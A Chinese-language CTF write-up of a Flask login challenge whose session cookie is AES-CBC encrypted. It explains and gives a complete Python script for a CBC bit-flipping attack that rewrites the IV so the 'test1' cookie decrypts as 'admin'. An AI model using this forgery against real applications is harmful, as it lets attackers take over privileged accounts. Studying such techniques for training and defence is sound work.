# Web 题 Writeup

## 1. 题目描述

本题为一个基于 Flask 的登录系统，用户登录成功后会将用户名加密后存入 cookie（session 字段），admin 用户登录后会显示 flag。加密方式为 AES-CBC，密钥和 IV 随机生成，填充方式为手动补 0。攻击者需要绕过登录验证，伪造 admin 用户的 session，获取 flag。

---

## 2. 知识点

- AES-CBC 加密与解密原理
- CBC 模式的可控性与密文篡改
- Cookie 伪造
- Python 脚本自动化

---

## 3. 解题思路

- 用户名加密后存入 session，采用 AES-CBC，填充方式为手动补 0。
- CBC 模式下，前一块密文（或 IV）可影响后一块明文的解密结果。
- 已知 test1 用户的 session，可以通过修改 IV，使解密后明文变为 admin。
- 只需将 IV 按位异或，令解密后前 5 字节为 admin，其余补 0。

---

## 4. 解题步骤

1. 用 test1 账号登录，抓包获取 session（cookie）。
2. 解析 session，得到 IV 和密文。
3. 构造目标明文 admin（补齐 16 字节）。
4. 计算新的 IV：new_iv = orig_iv ^ orig_plain ^ target_plain。
5. 用 new_iv + 原密文拼接成新的 session，作为 cookie 访问 /welcome。
6. 成功伪造 admin 登录，获得 flag。

---

## 5. exp 脚本

```python
import requests

url = "http://127.0.0.1:8000"

s = requests.Session()
# 登录获取合法 session
s.post(url + "/login", data={"username": "test1", "password": "test1"})
cookie = s.cookies.get("session")
data = bytes.fromhex(cookie)
iv = data[:16]
ct = data[16:32]

# 构造目标明文和原始明文
target = b"admin" + b"\x00" * 11
orig = b"test1" + b"\x00" * 11
# 计算新的 IV，使解密后为 admin
new_iv = bytes([iv[i] ^ orig[i] ^ target[i] for i in range(16)])

# 拼接伪造的 session
payload = (new_iv + ct).hex()
cookies = {"session": payload}
# 访问 /welcome，获取 flag
r = requests.get(url + "/welcome", cookies=cookies)
print(r.text)
```

---

成功访问 /welcome 后，即可获得 flag。
